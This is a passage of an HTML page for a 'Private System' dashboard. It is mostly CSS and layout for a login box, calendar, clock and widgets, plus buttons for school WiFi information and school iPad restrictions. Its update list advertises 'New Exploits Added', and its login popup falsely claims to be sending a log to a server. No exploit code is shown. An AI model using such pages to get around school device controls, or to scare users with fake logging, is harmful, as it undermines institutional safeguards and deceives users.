<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System</title>
  <style>
    /* Global CSS Variables for Theming */
    :root {
      --primary-bg: #1a1a1a;
      --secondary-bg: #2a2a2a;
      --tertiary-bg: #40210f;
      --text-color: #f9f2dc;
      --header-text-color: #000;
      --accent-color: #ff914d; /* Main accent for buttons, headers */
      --accent-light: #ffb67a;
      --accent-dark: #cc743e;
      --border-color: rgba(255, 145, 77, 0.3);
      --box-shadow-color: rgba(255, 145, 77, 0.3);
      --error-color: #ff4c4c;
      --success-color: #2ecc71;
      --info-color: #3498db;
      --warning-color: #f39c12;
      --font-family: 'Montserrat', sans-serif;
      --base-font-size: 16px;
      --panel-transition: all 0.5s ease-in-out;
      --button-transition: all 0.2s ease;
      --animation-speed: 0.5s; /* Global animation speed control */
    }

    /* Light Theme Overrides */
    body.light-theme {
      --primary-bg: #f9f2dc;
      --secondary-bg: #ffd966;
      --tertiary-bg: #ffd999;
      --text-color: #1a1a1a;
      --header-text-color: #000;
      --accent-color: #994d00; /* Darker accent for light theme */
      --accent-light: #cc6600;
      --accent-dark: #663300;
      --border-color: rgba(153, 77, 0, 0.6);
      --box-shadow-color: rgba(153, 77, 0, 0.6);
    }

    /* Core Styles */
    * {
      box-sizing: border-box;
      font-family: var(--font-family);
      transition: background-color var(--animation-speed), color var(--animation-speed), border-color var(--animation-speed), box-shadow var(--animation-speed);
    }
    
    body {
      margin: 0; padding: 0;
      font-size: var(--base-font-size);
      background-color: var(--primary-bg);
      color: var(--text-color);
      transition: background-color var(--animation-speed), color var(--animation-speed), font-size var(--animation-speed);
    }

    /* Login System Styles */
    body.login-body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    
    .login-box {
      background: var(--primary-bg);
      border-radius: 20px;
      border: 3px solid #fff;
      box-shadow: 0 0 15px #fff;
      width: 360px;
      padding: 30px 25px;
      text-align: center;
      position: relative;
      animation: fadeIn var(--animation-speed) ease-out; /* Added fade-in animation */
    }
    
    .login-box.flashing {
      animation: flashRed 0.4s ease-in-out 2;
    }
    
    @keyframes flashRed {
      0%, 100% { border-color: var(--error-color); box-shadow: 0 0 15px var(--error-color); }
      50% { border-color: #fff; box-shadow: 0 0 5px #fff; }
    }
    
    .login-box h2 {
      font-size: 1.7em;
      margin-bottom: 20px;
      font-family: 'Courier New', monospace; /* Kept original font for login title */
      color: var(--text-color);
    }
    
    .login-box input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      background: #1c1c1c;
      border: 1px solid var(--secondary-bg); /* Added subtle border */
      color: #fff;
      border-radius: 8px;
      font-size: 1em;
      transition: border-color var(--animation-speed), box-shadow var(--animation-speed);
    }
    .login-box input:focus {
        outline: none;
        border-color: var(--accent-color);
        box-shadow: 0 0 5px var(--accent-color);
    }
    
    .login-box label {
      display: flex;
      align-items: center;
      font-size: 0.9em;
      margin-bottom: 10px;
      gap: 10px;
      cursor: pointer;
      color: var(--text-color);
    }
    
    #showPassword:checked + span {
      color: var(--accent-color);
    }
    
    .login-box button {
      width: 100%;
      padding: 12px;
      background-color: var(--error-color); /* Login button is red by default */
      color: #fff;
      font-size: 1em;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color var(--animation-speed), transform 0.1s ease;
    }
    .login-box button:hover {
        background-color: var(--error-color); /* Still red, but maybe slightly different shade */
        transform: scale(1.02);
    }
    .login-box button:active {
        transform: scale(0.98);
    }
    
    .attempt-counter, .error-message {
      margin-top: 10px;
      font-size: 0.85em;
      color: var(--error-color);
    }
    
    .popup {
      display: none;
      position: absolute;
      top: 50%;
      left: 50%;
      width: 320px;
      padding: 20px;
      transform: translate(-50%, -50%);
      background: var(--primary-bg);
      border: 3px solid var(--accent-color);
      border-radius: 15px;
      box-shadow: 0 0 20px var(--accent-color);
      z-index: 10;
      color: var(--text-color);
    }
    
    .popup input {
      margin-bottom: 15px;
    }

    /* Dashboard Styles */
    body.dashboard-body {
      padding: 20px;
      zoom: 1; /* Retain zoom property */
      animation: fadeIn var(--animation-speed) ease-out; /* Added fade-in animation for dashboard */
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    .dashboard-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: var(--accent-color);
      padding: 15px 25px;
      border-radius: 12px;
      color: var(--header-text-color);
      margin-bottom: 20px;
      box-shadow: 0 4px 8px var(--box-shadow-color); /* Add subtle shadow */
    }

    .dashboard-header h1 {
      font-size: 24px;
      margin: 0;
    }

    .user-info {
      font-weight: bold;
    }

    .version-box {
      background: var(--accent-light);
      padding: 8px 15px;
      border-radius: 8px;
      color: var(--header-text-color);
      font-weight: bold;
    }

    .quick-bar {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 10px; 
      flex-wrap: wrap;
    }

    .quick-bar button {
      background-color: var(--accent-color);
      border: none;
      padding: 10px 14px;
      border-radius: 8px;
      color: var(--header-text-color);
      font-weight: bold;
      cursor: pointer;
      transition: var(--button-transition);
      min-width: 110px;
      white-space: nowrap;
      box-shadow: 0 2px 4px rgba(0,0,0,0.2);
    }

    .quick-bar button:hover {
      background-color: var(--accent-light);
      transform: translateY(-2px);
    }
    .quick-bar button:active {
        transform: translateY(0);
        box-shadow: 0 1px 2px rgba(0,0,0,0.2);
    }

    #panicBtn {
      background: var(--error-color) !important;
      color: white !important;
    }
    #panicBtn:hover {
        background: darken(var(--error-color), 10%) !important;
    }

    .announcement-bar {
      width: 100%;
      background-color: var(--accent-color);
      color: var(--header-text-color);
      font-weight: bold;
      padding: 10px 0;
      overflow: hidden;
      position: relative;
      border-radius: 8px;
      box-sizing: border-box;
      margin-bottom: 20px;
      user-select: none;
      height: 30px;
      line-height: 13px;
      box-shadow: 0 2px 4px var(--box-shadow-color);
    }

    .announcement-bar span {
      display: inline-block;
      white-space: nowrap;
      position: absolute;
      will-change: transform;
      animation: scrollLeft 15s linear infinite;
      padding-left: 100%;
    }

    @keyframes scrollLeft {
      0% {
        transform: translateX(0%);
      }
      100% {
        transform: translateX(-100%);
      }
    }

    body.light-theme .announcement-bar {
      background-color: var(--accent-light);
      color: var(--header-text-color);
    }

    .main-row {
      display: flex;
      gap: 20px;
      margin-bottom: 20px;
      flex-wrap: wrap;
    }

    .box {
      background-color: var(--secondary-bg);
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 15px var(--box-shadow-color);
      min-height: 120px;
      flex: 1 1 300px;
      animation: slideInUp var(--animation-speed) ease-out; /* Slide in animation for boxes */
    }

    @keyframes slideInUp {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
    }

    .box h2 {
      font-size: 18px;
      margin-bottom: 10px;
      color: var(--accent-light); /* Lighter accent for box titles */
    }

    body.light-theme .box h2 {
      color: var(--accent-dark);
    }

    .box p, .box ul {
      font-size: 14px;
      color: var(--text-color);
    }

    .update-entry {
      background: var(--tertiary-bg);
      padding: 8px;
      margin-top: 5px;
      border-radius: 6px;
      color: var(--text-color); /* Changed to use text-color */
    }

    body.light-theme .update-entry {
      background: var(--accent-light);
      color: var(--header-text-color);
    }

    .calendar {
      display: grid;
      grid-template-columns: repeat(7, 1fr);
      gap: 5px;
      margin-top: 10px;
      text-align: center;
      font-size: 12px;
    }

    .calendar div {
      padding: 6px;
      background: var(--tertiary-bg);
      border-radius: 4px;
    }

    .today {
      background: var(--accent-color) !important;
      font-weight: bold;
      color: var(--header-text-color) !important;
    }

    body.light-theme .calendar div {
      background: var(--accent-light);
      color: var(--text-color);
    }

    body.light-theme .today {
      background: var(--accent-dark) !important;
      color: var(--text-color) !important;
    }

    #canvasContainer {
      display: none;
      margin-top: 20px;
      text-align: center;
      background-color: var(--secondary-bg);
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 15px var(--box-shadow-color);
      animation: fadeIn var(--animation-speed) ease-out;
    }

    #notesCanvas {
      border: 2px solid var(--accent-color);
      border-radius: 12px;
      background: #fff; /* Canvas background fixed white */
      cursor: crosshair;
      touch-action: none;
    }

    #canvasControls {
      margin-top: 10px;
    }

    #canvasControls button {
      background-color: var(--accent-color);
      border: none;
      padding: 8px 16px;
      border-radius: 8px;
      color: var(--header-text-color);
      font-weight: bold;
      cursor: pointer;
      transition: var(--button-transition);
      margin: 0 5px;
    }

    #canvasControls button:hover {
      background-color: var(--accent-light);
      transform: translateY(-2px);
    }

    .motivation-box {
      background-color: var(--tertiary-bg);
      color: var(--text-color); /* Changed to use text-color */
      padding: 20px;
      border-radius: 12px;
      font-style: italic;
      font-size: 16px;
      box-shadow: 0 0 12px var(--box-shadow-color);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 120px;
      text-align: center;
    }

    body.light-theme .motivation-box {
      background-color: var(--accent-light);
      color: var(--header-text-color);
      box-shadow: 0 0 12px var(--box-shadow-color);
    }

    /* Info Panel Styles */
    .info-panel {
      display: none;
      background-color: var(--secondary-bg);
      padding: 20px;
      border-radius: 12px;
      margin-top: 20px;
      box-shadow: 0 0 15px var(--box-shadow-color);
      animation: fadeInSlideUp var(--animation-speed) ease-out; /* Fade in and slide up */
    }

    @keyframes fadeInSlideUp {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
    }

    body.light-theme .info-panel {
      background-color: var(--secondary-bg);
      color: var(--text-color);
    }

    .info-panel h2 {
      color: var(--accent-color);
      margin-bottom: 15px;
      border-bottom: 2px solid var(--accent-dark); /* Subtle header underline */
      padding-bottom: 10px;
    }

    body.light-theme .info-panel h2 {
      color: var(--accent-dark);
    }

    .wifi-grid, .wifi-entry, .school-info-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(100px, 1fr)); /* Responsive grid */
      gap: 10px;
      margin-bottom: 15px;
    }
    .wifi-grid { margin-bottom: 5px; } /* Slightly less space above entries */

    .wifi-grid div {
      padding: 8px;
      background: var(--tertiary-bg);
      border-radius: 6px;
      text-align: center;
      font-weight: bold;
      color: var(--text-color);
    }

    body.light-theme .wifi-grid div {
      background: var(--accent-light);
    }

    .wifi-entry div {
      padding: 8px;
      background: var(--tertiary-bg);
      border-radius: 6px;
      text-align: center;
      color: var(--text-color);
    }

    body.light-theme .wifi-entry div {
      background: var(--accent-light);
    }

    .handbook-buttons, .links-list, .exploit-buttons, .bypass-buttons {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    .handbook-buttons a,
    .links-list a,
    .exploit-buttons a,
    .bypass-buttons button {
      display: block;
      background-color: var(--accent-color);
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: var(--header-text-color);
      font-weight: bold;
      cursor: pointer;
      transition: var(--button-transition);
      text-decoration: none;
      text-align: center;
      box-shadow: 0 2px 4px rgba(0,0,0,0.2);
    }

    .handbook-buttons a:hover,
    .links-list a:hover,
    .exploit-buttons a:hover,
    .bypass-buttons button:hover {
      background-color: var(--accent-light);
      transform: translateY(-2px);
    }
    .handbook-buttons a:active,
    .links-list a:active,
    .exploit-buttons a:active,
    .bypass-buttons button:active {
        transform: translateY(0);
        box-shadow: 0 1px 2px rgba(0,0,0,0.2);
    }

    .coming-soon {
      background: var(--tertiary-bg);
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      text-align: center;
      font-weight: bold;
      color: var(--text-color);
      border: 1px dashed var(--accent-color);
      animation: pulse 1.5s infinite alternate; /* Added pulse animation */
    }

    @keyframes pulse {
        from { transform: scale(1); opacity: 0.9; }
        to { transform: scale(1.02); opacity: 1; }
    }

    body.light-theme .coming-soon {
      background: var(--accent-light);
    }

    .info-text {
      background: var(--tertiary-bg);
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      color: var(--text-color);
      line-height: 1.6;
    }

    body.light-theme .info-text {
      background: var(--accent-light);
    }

    .school-info-item {
      background: var(--tertiary-bg);
      padding: 12px;
      border-radius: 8px;
      color: var(--text-color);
    }

    body.light-theme .school-info-item {
      background: var(--accent-light);
    }

    .school-info-label {
      font-weight: bold;
      color: var(--accent-color);
      margin-bottom: 5px;
    }

    body.light-theme .school-info-label {
      color: var(--accent-dark);
    }

    .ipad-options {
      display: flex;
      gap: 10px;
      margin-top: 15px;
    }

    .ipad-options button {
      flex: 1;
      background-color: var(--accent-color);
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: var(--header-text-color);
      font-weight: bold;
      cursor: pointer;
      transition: var(--button-transition);
    }

    .ipad-options button:hover {
      background-color: var(--accent-light);
      transform: translateY(-2px);
    }

    .ipad-content, .bypass-content {
      display: none;
      background: var(--tertiary-bg);
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      color: var(--text-color);
      animation: fadeIn var(--animation-speed) ease-out;
    }
    
    body.light-theme .ipad-content, body.light-theme .bypass-content {
      background: var(--accent-light);
    }

    /* New Feature Styles */

    /* Reminder System */
    #reminderList {
        list-style: none;
        padding: 0;
        margin-top: 15px;
    }
    .reminder-item {
        background: var(--tertiary-bg);
        padding: 10px;
        margin-bottom: 8px;
        border-radius: 6px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        border-left: 5px solid var(--accent-color);
        animation: slideInLeft var(--animation-speed) ease-out;
    }
    .reminder-item.completed {
        text-decoration: line-through;
        opacity: 0.7;
        border-left-color: var(--success-color);
    }
    .reminder-item div {
        flex-grow: 1;
        margin-right: 10px;
    }
    .reminder-item span {
        display: block;
        font-size: 0.9em;
        color: rgba(249, 242, 220, 0.7); /* Slightly muted for date/time */
    }
    .reminder-controls button {
        background: var(--accent-dark);
        color: white;
        border: none;
        padding: 5px 10px;
        border-radius: 5px;
        cursor: pointer;
        margin-left: 5px;
        font-size: 0.8em;
        transition: var(--button-transition);
    }
    .reminder-controls button:hover {
        background: var(--accent-color);
        transform: scale(1.05);
    }
    .reminder-form input[type="text"],
    .reminder-form input[type="date"],
    .reminder-form input[type="time"] {
        width: calc(100% - 20px);
        padding: 8px;
        margin-bottom: 10px;
        background: #1c1c1c;
        border: 1px solid var(--accent-dark);
        color: white;
        border-radius: 5px;
        font-size: 0.9em;
    }
    .reminder-form button {
        background-color: var(--success-color);
        color: white;
        padding: 10px 15px;
        border-radius: 8px;
        border: none;
        cursor: pointer;
        transition: var(--button-transition);
    }
    .reminder-form button:hover {
        background-color: darken(var(--success-color), 10%);
        transform: scale(1.02);
    }

    /* Settings Panel */
    .settings-group {
        margin-bottom: 20px;
        padding: 15px;
        background: var(--tertiary-bg);
        border-radius: 8px;
        border-left: 5px solid var(--info-color);
        animation: slideInRight var(--animation-speed) ease-out;
    }
    .settings-group h3 {
        color: var(--info-color);
        margin-top: 0;
        border-bottom: 1px dashed var(--info-color);
        padding-bottom: 5px;
        margin-bottom: 10px;
    }
    .color-picker-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(40px, 1fr));
        gap: 8px;
        margin-top: 10px;
    }
    .color-box {
        width: 40px;
        height: 40px;
        border-radius: 5px;
        cursor: pointer;
        border: 2px solid transparent;
        transition: border-color 0.1s ease;
    }
    .color-box.selected {
        border-color: #fff;
        box-shadow: 0 0 5px #fff;
    }
    .settings-group label {
        display: flex;
        align-items: center;
        gap: 10px;
        margin-bottom: 10px;
    }
    .settings-group input[type="range"] {
        width: 100%;
        -webkit-appearance: none;
        height: 8px;
        border-radius: 5px;
        background: var(--accent-dark);
        outline: none;
        opacity: 0.7;
        transition: opacity var(--animation-speed);
    }
    .settings-group input[type="range"]:hover {
        opacity: 1;
    }
    .settings-group input[type="range"]::-webkit-slider-thumb {
        -webkit-appearance: none;
        appearance: none;
        width: 20px;
        height: 20px;
        border-radius: 50%;
        background: var(--accent-color);
        cursor: pointer;
        box-shadow: 0 0 2px rgba(0,0,0,0.5);
    }
    .settings-group input[type="range"]::-moz-range-thumb {
        width: 20px;
        height: 20px;
        border-radius: 50%;
        background: var(--accent-color);
        cursor: pointer;
        box-shadow: 0 0 2px rgba(0,0,0,0.5);
    }
    .settings-group input[type="checkbox"] {
        width: 20px;
        height: 20px;
        cursor: pointer;
    }
    .settings-group button {
        background-color: var(--info-color);
        color: white;
        padding: 8px 12px;
        border-radius: 6px;
        border: none;
        cursor: pointer;
        transition: var(--button-transition);
        margin-top: 10px;
    }
    .settings-group button:hover {
        background-color: darken(var(--info-color), 10%);
        transform: scale(1.02);
    }

    /* Quote Generator */
    #quoteDisplay {
        font-size: 1.2em;
        font-style: italic;
        margin-bottom: 15px;
        color: var(--text-color);
        animation: fadeScaleIn var(--animation-speed) ease-out;
    }
    #quoteAuthor {
        font-size: 0.9em;
        text-align: right;
        display: block;
        color: var(--accent-light);
    }
    #newQuoteBtn {
        background-color: var(--warning-color);
        color: white;
        padding: 10px 15px;
        border-radius: 8px;
        border: none;
        cursor: pointer;
        transition: var(--button-transition);
        margin-top: 10px;
    }
    #newQuoteBtn:hover {
        background-color: darken(var(--warning-color), 10%);
        transform: scale(1.02);
    }

    /* System Diagnostics */
    .diagnostics-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
        gap: 15px;
        margin-top: 15px;
    }
    .diag-item {
        background: var(--tertiary-bg);
        padding: 15px;
        border-radius: 8px;
        text-align: center;
        border-bottom: 3px solid var(--accent-dark);
        box-shadow: 0 2px 5px rgba(0,0,0,0.2);
    }
    .diag-item h3 {
        margin-top: 0;
        color: var(--accent-color);
        font-size: 1.1em;
    }
    .diag-value {
        font-size: 1.8em;
        font-weight: bold;
        color: var(--text-color);
        margin-top: 10px;
    }
    .diag-status {
        font-size: 0.85em;
        color: rgba(249, 242, 220, 0.6);
    }
    .progress-bar-container {
        width: 100%;
        background-color: var(--secondary-bg);
        border-radius: 5px;
        margin-top: 10px;
        overflow: hidden;
    }
    .progress-bar {
        height: 10px;
        border-radius: 5px;
        background-color: var(--success-color);
        width: 0%;
        transition: width 0.5s ease-out;
    }
    .progress-bar.warning { background-color: var(--warning-color); }
    .progress-bar.danger { background-color: var(--error-color); }

    /* Task Manager */
    #taskList {
        list-style: none;
        padding: 0;
        margin-top: 15px;
    }
    .task-item {
        background: var(--tertiary-bg);
        padding: 12px;
        margin-bottom: 8px;
        border-radius: 6px;
        display: flex;
        flex-wrap: wrap; /* Allow wrapping for smaller screens */
        justify-content: space-between;
        align-items: center;
        border-left: 5px solid var(--info-color);
        animation: slideInRight var(--animation-speed) ease-out;
    }
    .task-item.completed {
        text-decoration: line-through;
        opacity: 0.7;
        border-left-color: var(--success-color);
    }
    .task-content {
        flex-grow: 1;
        margin-right: 10px;
        min-width: 150px; /* Ensure content doesn't shrink too much */
    }
    .task-content .task-title {
        font-weight: bold;
        color: var(--text-color);
    }
    .task-content .task-details {
        font-size: 0.85em;
        color: rgba(249, 242, 220, 0.7);
    }
    .task-controls {
        display: flex;
        gap: 5px;
    }
    .task-controls button {
        background: var(--accent-dark);
        color: white;
        border: none;
        padding: 6px 12px;
        border-radius: 5px;
        cursor: pointer;
        font-size: 0.8em;
        transition: var(--button-transition);
    }
    .task-controls button:hover {
        background: var(--accent-color);
        transform: scale(1.05);
    }
    .task-form input, .task-form select, .task-form button {
        width: calc(100% - 20px);
        padding: 8px;
        margin-bottom: 10px;
        background: #1c1c1c;
        border: 1px solid var(--accent-dark);
        color: white;
        border-radius: 5px;
        font-size: 0.9em;
    }
    .task-form button {
        background-color: var(--info-color);
        color: white;
        width: auto;
        padding: 10px 15px;
    }
    .task-form button:hover {
        background-color: darken(var(--info-color), 10%);
    }

    /* Virtual Assistant */
    #chatBox {
        height: 300px;
        background: var(--tertiary-bg);
        border-radius: 8px;
        padding: 15px;
        overflow-y: auto;
        margin-bottom: 15px;
        border: 1px solid var(--accent-dark);
    }
    .chat-message {
        margin-bottom: 10px;
        padding: 8px 12px;
        border-radius: 15px;
        max-width: 80%;
        word-wrap: break-word;
        animation: fadeInUp 0.3s ease-out;
    }
    @keyframes fadeInUp {
        from { opacity: 0; transform: translateY(10px); }
        to { opacity: 1; transform: translateY(0); }
    }
    .chat-message.user {
        background-color: var(--accent-color);
        color: var(--header-text-color);
        margin-left: auto;
        border-bottom-right-radius: 2px;
    }
    .chat-message.assistant {
        background-color: var(--secondary-bg);
        color: var(--text-color);
        margin-right: auto;
        border-bottom-left-radius: 2px;
    }
    #chatInput {
        width: calc(100% - 70px);
        padding: 10px;
        background: #1c1c1c;
        border: 1px solid var(--accent-dark);
        color: white;
        border-radius: 8px;
        font-size: 1em;
        margin-right: 5px;
    }
    #sendChatBtn {
        width: 60px;
        padding: 10px;
        background-color: var(--success-color);
        color: white;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        transition: var(--button-transition);
    }
    #sendChatBtn:hover {
        background-color: darken(var(--success-color), 10%);
        transform: scale(1.02);
    }

    /* Resource Library */
    .resource-category {
        margin-bottom: 20px;
        padding: 15px;
        background: var(--tertiary-bg);
        border-radius: 8px;
        border-left: 5px solid var(--warning-color);
        animation: fadeIn var(--animation-speed) ease-out;
    }
    .resource-category h3 {
        color: var(--warning-color);
        margin-top: 0;
        border-bottom: 1px dashed var(--warning-color);
        padding-bottom: 5px;
        margin-bottom: 10px;
    }
    .resource-category ul {
        list-style: none;
        padding: 0;
    }
    .resource-category ul li {
        margin-bottom: 8px;
    }
    .resource-category ul li a {
        color: var(--text-color);
        text-decoration: none;
        display: block;
        background: rgba(0,0,0,0.2); /* Slightly darker bg for links */
        padding: 8px;
        border-radius: 5px;
        transition: background-color var(--button-transition);
    }
    .resource-category ul li a:hover {
        background: var(--accent-dark);
        color: white;
    }

    /* Weather Panel */
    .weather-forecast-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
        gap: 15px;
        margin-top: 15px;
    }
    .weather-day {
        background: var(--tertiary-bg);
        padding: 15px;
        border-radius: 8px;
        text-align: center;
        box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        animation: zoomIn 0.3s ease-out;
    }
    @keyframes zoomIn {
        from { opacity: 0; transform: scale(0.9); }
        to { opacity: 1; transform: scale(1); }
    }
    .weather-day.today-weather {
        border: 2px solid var(--accent-color);
    }
    .weather-day h3 {
        margin-top: 0;
        color: var(--accent-color);
        font-size: 1.1em;
    }
    .weather-icon {
        font-size: 2.5em;
        margin: 10px 0;
        color: var(--text-color);
    }
    .weather-temp {
        font-size: 1.4em;
        font-weight: bold;
        color: var(--text-color);
    }
    .weather-desc {
        font-size: 0.9em;
        color: rgba(249, 242, 220, 0.7);
        margin-top: 5px;
    }

    /* Calculator */
    .calculator-grid {
        display: grid;
        grid-template-columns: repeat(4, 1fr);
        gap: 10px;
        margin-top: 15px;
        max-width: 300px; /* Constrain calculator size */
        margin-left: auto;
        margin-right: auto;
    }
    #calcDisplay {
        grid-column: 1 / -1;
        background: #1c1c1c;
        color: white;
        padding: 15px;
        border-radius: 8px;
        text-align: right;
        font-size: 2em;
        margin-bottom: 10px;
        overflow-x: auto;
        white-space: nowrap;
        border: 1px solid var(--accent-dark);
    }
    .calculator-grid button {
        background-color: var(--secondary-bg);
        color: var(--text-color);
        padding: 15px;
        border: none;
        border-radius: 8px;
        font-size: 1.2em;
        cursor: pointer;
        transition: var(--button-transition);
        box-shadow: 0 2px 4px rgba(0,0,0,0.2);
    }
    .calculator-grid button.operator {
        background-color: var(--accent-color);
        color: var(--header-text-color);
    }
    .calculator-grid button.equals {
        background-color: var(--success-color);
        color: white;
    }
    .calculator-grid button.clear {
        background-color: var(--error-color);
        color: white;
    }
    .calculator-grid button:hover {
        opacity: 0.8;
        transform: scale(1.02);
    }
    .calculator-grid button:active {
        transform: scale(0.98);
    }

    /* Analog Clock Widget */
    .analog-clock-container {
      display: flex;
      justify-content: center;
      margin-top: 20px;
      padding: 20px;
      background: var(--tertiary-bg);
      border-radius: 12px;
      box-shadow: 0 4px 8px var(--box-shadow-color);
    }
    #analogClock {
      width: 200px;
      height: 200px;
      border: 5px solid var(--accent-color);
      border-radius: 50%;
      position: relative;
      background-color: var(--secondary-bg);
      box-shadow: inset 0 0 10px rgba(0,0,0,0.5);
    }
    #analogClock::before {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      width: 12px;
      height: 12px;
      background: var(--text-color);
      border-radius: 50%;
      transform: translate(-50%, -50%);
      z-index: 10;
    }
    .hand {
      position: absolute;
      top: 50%;
      left: 50%;
      transform-origin: bottom center;
      background: var(--text-color);
      border-radius: 2px;
      z-index: 5;
    }
    #hourHand {
      width: 4px;
      height: 60px;
      margin-left: -2px;
      margin-top: -60px;
      background: var(--accent-color);
    }
    #minuteHand {
      width: 3px;
      height: 80px;
      margin-left: -1.5px;
      margin-top: -80px;
    }
    #secondHand {
      width: 2px;
      height: 90px;
      margin-left: -1px;
      margin-top: -90px;
      background: var(--error-color);
    }
    
    /* Animation toggle global impact */
    body.animations-disabled *, body.animations-disabled *::before, body.animations-disabled *::after {
        animation: none !important;
        transition: none !important;
    }

    /* Responsive Adjustments */
    @media (max-width: 768px) {
      .dashboard-header {
        flex-direction: column;
        text-align: center;
      }
      .dashboard-header h1 {
        margin-bottom: 10px;
      }
      .quick-bar {
        flex-direction: column;
        align-items: stretch;
      }
      .main-row, #updatesNotifications {
        flex-direction: column;
      }
      .box {
        flex: 1 1 100% !important; /* Make boxes take full width on small screens */
      }
      .wifi-grid, .wifi-entry, .school-info-grid, 
      .handbook-buttons, .links-list, .exploit-buttons, .bypass-buttons,
      .diagnostics-grid, .weather-forecast-grid {
        grid-template-columns: 1fr;
      }
      .login-box {
        width: 90%;
      }
      #chatInput {
          width: calc(100% - 90px);
      }
      #sendChatBtn {
          width: 80px;
      }
    }
  </style>
  
  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
</head>
<body class="login-body" id="bodyElement">

  <!-- Login System -->
  <div class="login-box" id="loginBox">
    <h2>𝙋𝙧𝙞𝙫𝙖𝙩𝙚 𝙎𝙮𝙨𝙩𝙚𝙢</h2>

    <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
    <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
    <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

    <label for="showPassword">
      <input type="checkbox" id="showPassword" />
      <span>Show Password</span>
    </label>

    <button id="submitBtn">Submit</button>

    <div class="error-message" id="errorMsg"></div>
    <div class="attempt-counter" id="attemptsText">Attempts Left: 5</div>

    <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
      <p>Too many failed attempts.</p>
      <input type="password" id="resetField" placeholder="SENDING LOG TO SERVER PLEASE WAIT WHILE WE ACCEPT IT" autocomplete="off" />
      <button id="resetBtn">Reset Counter</button>
    </div>
  </div>

  <!-- Dashboard (hidden by default) -->
  <div id="dashboard" style="display: none;">
    <div class="dashboard-header" id="dashboardHeader">
      <div>
        <h1>Private Dashboard GUI</h1>
        <div class="user-info">User - <span id="loggedInUser">Beta.user</span> | ID: <span id="loggedInID">281573</span></div>
      </div>
      <div class="version-box">Version 1.5.6</div>
    </div>

    <!-- Quick Bar (Existing) -->
    <div class="quick-bar">
      <button id="sessionTime">⏳ Session Time: 00:00:00</button>
      <button id="realTimeClock">🕒 --:--:--</button>
      <button id="realDate">📅 --</button>
      <button id="notesBtn">📒 Notes</button>
      <button id="exportNotesBtn">💾 Export Notes</button>
      <button id="screenshotBtn">📸 Screenshot</button>
      <button id="toggleSectionsBtn">⬆️ Toggle Sections</button>
      <button id="fixIssuesBtn">🛠️ Fix Issues</button>
      <button id="fullScreenBtn">🖥️ Full Screen</button>
      <button id="zoomInBtn">➕ Zoom In</button>
      <button id="zoomOutBtn">➖ Zoom Out</button>
      <button id="restartBtn">🔄 Restart</button>
      <button id="panicBtn">🚨 Panic</button>
      <button id="themeToggle">🌙 Dark Mode</button>
      <button id="logoutBtn">🔓 Log Out</button>
    </div>
    
    <div id="announcementBar" class="announcement-bar">
      <span>🚨 Welcome to the Private Dashboard GUI. Stay tuned for updates and alerts! 🚨</span>
    </div>
    
    <div class="main-row" id="mainGrid">
      
      <div class="box">
        <h2>📅 Calendar</h2>
        <div class="calendar" id="calendar"></div>
      </div>

      <div class="box motivation-box" id="motivationBox">
        "Success is not final, failure is not fatal: It is the courage to continue that counts." – Winston Churchill
      </div>
    </div>

    <div id="updatesNotifications" style="display: flex; gap: 20px; justify-content: center; flex-wrap: nowrap; margin-top: 20px;">
      <div class="box" style="flex: 1 1 300px; min-width: 300px;">
        <h2>🔄 Updates</h2>
        <div class="update-entry">Dashboard Interface Update!</div>
        <div class="update-entry">New Exploits Added</div>
        <div class="update-entry">UI Overhaul Deployed</div>
        <div class="update-entry">Reminder System Launched!</div>
        <div class="update-entry">Settings Panel Added!</div>
        <div class="update-entry">Simulated System Diagnostics Now Available!</div>
        <div class="update-entry">Task Manager & Virtual Assistant Integrated!</div>
        <div class="update-entry">Resource Library Expanded!</div>
        <div class="update-entry">New Weather & Calculator Widgets!</div>
        <div class="update-entry">Analog Clock Added!</div>
      </div>

      <div class="box" style="flex: 1 1 300px; min-width: 300px;">
        <h2>🔔 Notifications</h2>
        <p>Starting to work on the log in system. Stay tuned for more!</p>
        <p>Your session has been logged securely. Check your dashboard for new features.</p>
        <p>New security update deployed to prevent unauthorized access attempts.</p>
        <p>Remember to set your daily reminders!</p>
        <p>Explore the new settings to customize your experience!</p>
      </div>
    </div>

    <!-- Main Feature Buttons (Expanded) -->
    <div class="quick-bar" style="flex-wrap: wrap; margin-top: 30px;">
      <button onclick="dashboard.togglePanel('wifiPanel')">📡 School WiFi Information</button>
      <button onclick="dashboard.togglePanel('ipadPanel')">📱 School iPad Restrictions</button>
